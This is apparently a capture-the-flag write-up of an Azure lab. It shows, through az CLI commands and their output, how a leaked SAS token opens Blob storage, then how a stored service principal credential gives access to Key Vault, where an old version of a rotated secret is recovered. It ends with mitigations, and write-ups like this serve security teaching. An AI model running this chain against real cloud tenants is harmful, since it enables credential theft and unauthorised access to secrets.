# CryptoCabana

**Difficulty:** Medium  
**Category:** Cloud Security, Azure Storage, Key Vault

---

## Summary

This room focuses on exploiting misconfigured Azure cloud resources. An exposed Azure Blob Storage SAS token was discovered inside a client-side JavaScript file. By abusing this token, it was possible to enumerate Azure Storage containers and access sensitive backup files.

A leaked Service Principal credential file provided access to Azure Key Vault, where secret fragments were stored. One of the secrets had been rotated, but an older version was still available, allowing recovery of the missing value and reconstruction of the flag.

---

# Attack Chain

1. Analyze the Azure Static Website source code.
2. Identify an exposed Azure Blob Storage SAS token.
3. Use the SAS token to enumerate Blob Storage containers.
4. Discover the `vault` container containing sensitive files.
5. Download the `backup-service-account.json` file.
6. Extract Azure Service Principal credentials.
7. Authenticate to Azure using the leaked credentials.
8. Enumerate Azure Key Vault secrets.
9. Recover the previous version of the rotated secret.
10. Combine secret fragments to obtain the flag.

---

# Enumeration

## Azure Static Website Analysis

The challenge provided an Azure Static Website:

```
https://cryptocabanaf5scjagc.z13.web.core.windows.net/
```

The website contained a seed phrase backup functionality.

Inspecting the JavaScript source file (`app.js`) revealed sensitive Azure Storage information:

```javascript
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";

const BACKUP_SAS =
"?sv=2022-11-02&ss=b&srt=sco&sp=rl...";
```

The SAS token was exposed in the client-side code.

Permissions:

```
sp=rl
```

Meaning:

- `r` → Read access
- `l` → List access

This allowed enumeration of Azure Blob Storage.

---

# Azure Storage Enumeration

Using the exposed SAS token, storage containers were enumerated.

```bash
az storage container list \
--account-name cryptocabanaf5scjagc \
--sas-token "<SAS_TOKEN>" \
-o table
```

Output:

```
$web
backups
vault
```

The `vault` container appeared interesting because it contained sensitive data.

---

# Accessing Vault Container

The blobs inside the container were listed:

```bash
az storage blob list \
--account-name cryptocabanaf5scjagc \
--container-name vault \
--sas-token "<SAS_TOKEN>" \
-o table
```

Output:

```
backup-service-account.json
seed_phrase.txt
```

The `backup-service-account.json` file contained Azure authentication details.

---

# Initial Access

## Extracting Azure Credentials

The JSON file was downloaded:

```bash
az storage blob download \
--account-name cryptocabanaf5scjagc \
--container-name vault \
--name backup-service-account.json \
--file backup-service-account.json \
--sas-token "<SAS_TOKEN>"
```

Reading the file:

```bash
cat backup-service-account.json
```

Contents:

```json
{
 "client_id":"<CLIENT_ID>",
 "client_secret":"<CLIENT_SECRET>",
 "key_vault_name":"ccabana-kv-f5scjagc",
 "key_vault_uri":"https://ccabana-kv-f5scjagc.vault.azure.net/",
 "tenant_id":"<TENANT_ID>"
}
```

The file exposed credentials for an Azure Service Principal.

---

# Azure Service Principal Login

Using the leaked credentials:

```bash
az login \
--service-principal \
--username "<CLIENT_ID>" \
--password "<CLIENT_SECRET>" \
--tenant "<TENANT_ID>"
```

Verify authentication:

```bash
az account show
```

The current identity was now the backup automation Service Principal.

---

# Azure Key Vault Enumeration

The Key Vault name was obtained from the JSON file:

```
ccabana-kv-f5scjagc
```

List available secrets:

```bash
az keyvault secret list \
--vault-name ccabana-kv-f5scjagc \
-o table
```

Secrets discovered:

```
key-shard-1
key-shard-2
key-shard-3
master-key
```

---

# Secret Extraction

## key-shard-1

```bash
az keyvault secret show \
--vault-name ccabana-kv-f5scjagc \
--name key-shard-1 \
--query value -o tsv
```

Output:

```
THM{******
```

---

## key-shard-3

```bash
az keyvault secret show \
--vault-name ccabana-kv-f5scjagc \
--name key-shard-3 \
--query value -o tsv
```

Output:

```
*********}
```

---

# Recovering Rotated Secret Version

The current value of `key-shard-2` contained a hint:

```
Rotated this after IT flagged it -- old value should still be recoverable if you know where to look.
```

This indicated that an older version of the secret still existed.

List available versions:

```bash
az keyvault secret list-versions \
--vault-name ccabana-kv-f5scjagc \
--name key-shard-2 \
--query "[].id" \
-o tsv
```

Example output:

```
https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/<VERSION_ID>
```

The old version was retrieved:

```bash
az keyvault secret show \
--vault-name ccabana-kv-f5scjagc \
--name key-shard-2 \
--version <VERSION_ID> \
--query value -o tsv
```

This returned the missing flag fragment.

---

# Flag Reconstruction

The three secret values were combined:

```
key-shard-1:
THM{******

key-shard-2:
<Recovered value>

key-shard-3:
*********}
```

Combining all parts revealed the final flag.

---

# Mitigation

* Never expose Azure SAS tokens in frontend JavaScript.
* Avoid storing sensitive files inside publicly accessible Blob Storage.
* Use Managed Identity instead of Service Principal credentials.
* Apply least privilege access control to Azure resources.
* Properly configure Azure Key Vault RBAC.
* Remove old secret versions after rotation.
* Enable Azure monitoring and alerting for credential exposure.
